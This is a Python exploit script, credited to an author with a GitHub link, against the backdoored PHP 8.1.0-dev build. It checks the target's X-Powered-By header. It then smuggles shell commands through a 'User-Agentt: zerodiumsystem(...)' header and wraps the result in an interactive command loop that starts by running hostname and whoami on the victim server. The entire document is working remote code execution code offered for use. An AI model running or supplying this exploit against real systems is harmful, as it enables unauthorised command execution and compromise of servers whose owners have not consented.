#!/usr/bin/env python3
import requests
import sys
import re
import cmd

def check_target(url):
    resp = requests.get(url)
    if resp.headers['X-Powered-By'] == 'PHP/8.1.0-dev':
        return True
    else:
        return False

def command(url, line):
    pattern = re.compile("<.*html.*>")
    payload = {
        'User-Agentt': f'zerodiumsystem(\'{line}\');'
    }
    resp = requests.get(url, headers=payload)
    output = pattern.split(resp.text)[0].strip()
    return output

class ZerodiumRCE(cmd.Cmd):
    intro = """
    # Author: IamF
    # Source: https://github.com/fahmifj/php-8.1.0-dev-zerodium-rce
    """
    hostname = ''
    user = ''
    prompt = ''   
    def default(self, line):
        print(command(url, line))


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s http://example.com/" % sys.argv[0])
        sys.exit(-1)

    if check_target(url):
            mikun = ZerodiumRCE()
            mikun.hostname = command(url, 'hostname')
            mikun.user = command(url, 'whoami')
            mikun.prompt = f'{mikun.user}@{mikun.hostname}$ '
            try:
                mikun.cmdloop()
            except KeyboardInterrupt:
                print('\n[!] Interrupted')
                sys.exit(-1)
    else:
        print("[-] Target is not vulnerable")
        sys.exit(-1)
